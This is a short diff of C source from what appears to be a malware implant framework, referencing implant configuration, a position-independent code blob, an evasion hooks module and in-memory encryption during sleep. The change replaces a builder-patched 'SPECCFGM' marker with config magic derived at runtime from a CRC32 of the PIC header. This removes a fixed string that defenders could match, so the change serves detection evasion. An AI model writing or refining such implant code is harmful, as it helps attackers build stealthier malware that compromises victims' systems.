@@ -25,26 +25,41 @@ static IMPLANT_CONFIG g_config;
 static BYTE g_profile_blob_buf[MAX_PROFILE_BLOB];
 
 /* ================================================================== */
-/*  Per-build config magic — patchable by builder                      */
+/*  Per-build config magic — derived from CRC32 of PIC header          */
 /* ================================================================== */
 
 /*
- * The builder scans for "SPECCFGM" (8 bytes) followed by 4 zero bytes,
- * writes the per-build random magic into those 4 bytes, then scrubs the
- * marker prefix to random data. At runtime, only the 4-byte magic
- * value at offset 8 remains meaningful.
+ * Phase 0.4: config magic is derived at runtime from CRC32(pic_base[0..64]).
+ * The builder computes the same CRC32 over the first 64 bytes of the PIC
+ * blob, so both sides agree on the magic without any patchable marker.
  *
- * Layout before builder:  ['S','P','E','C','C','F','G','M', 0,0,0,0]
- * Layout after builder:   [random 8 bytes] [magic: u32 LE]
+ * Uses IEEE 802.3 CRC32 (polynomial 0xEDB88320), same as evasion/hooks.c.
  */
-/* Builder-patchable config magic region.
-   volatile prevents constant-folding of the read in cfg_get_magic(). */
-static volatile BYTE cfg_magic_marker[12] = {
-    'S','P','E','C','C','F','G','M', 0x00, 0x00, 0x00, 0x00
-};
+
+/* Forward declaration — defined below */
+static PVOID cfg_get_pic_base(void);
+
+/* CRC32 computation — same algorithm as evasion_compute_crc() in hooks.c */
+static DWORD cfg_compute_crc32(const BYTE *data, DWORD len) {
+    DWORD crc = 0xFFFFFFFF;
+    for (DWORD i = 0; i < len; i++) {
+        crc ^= data[i];
+        for (int bit = 0; bit < 8; bit++) {
+            if (crc & 1)
+                crc = (crc >> 1) ^ 0xEDB88320;
+            else
+                crc >>= 1;
+        }
+    }
+    return crc ^ 0xFFFFFFFF;
+}
 
 DWORD cfg_get_magic(void) {
-    return *(volatile DWORD *)(cfg_magic_marker + 8);
+    PVOID pic_base = cfg_get_pic_base();
+    if (!pic_base)
+        return 0;
+    DWORD len = 64;  /* CONFIG_KEY_INPUT_SIZE */
+    return cfg_compute_crc32((const BYTE *)pic_base, len);
 }
 
 /* In-memory encryption state (used during sleep) */
